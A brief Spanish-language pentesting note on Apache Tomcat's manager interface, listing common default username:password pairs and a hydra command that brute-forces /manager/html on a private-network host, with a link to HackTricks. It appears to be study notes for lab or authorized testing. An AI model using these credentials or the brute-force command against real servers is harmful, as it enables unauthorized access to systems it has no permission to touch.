## Credenciales por defecto

Probar estas credenciales en el `/manager/html` esta ruta tiene dentro una `/upload` la cual se puede subir archivos pero esta protegido por HTTP auth.


```
admin:admin
tomcat:tomcat
admin:
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat
```

## Fuerza bruta

```
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f 192.168.1.43 http-get /manager/html -s 8080
```

Hacer una lista con users.txt con admin,tomcat etc.

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat